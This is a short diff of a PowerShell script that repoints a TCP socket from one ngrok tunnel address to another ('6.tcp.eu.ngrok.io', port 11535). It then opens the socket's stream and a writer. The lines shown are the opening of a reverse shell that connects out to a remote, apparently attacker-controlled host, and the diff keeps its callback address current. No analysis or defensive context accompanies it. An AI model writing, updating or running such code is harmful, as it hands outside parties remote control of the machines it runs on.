@@ -1,4 +1,4 @@
-$socket = new-object System.Net.Sockets.TcpClient('0.tcp.eu.ngrok.io', 18665);
+$socket = new-object System.Net.Sockets.TcpClient('6.tcp.eu.ngrok.io', 11535);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
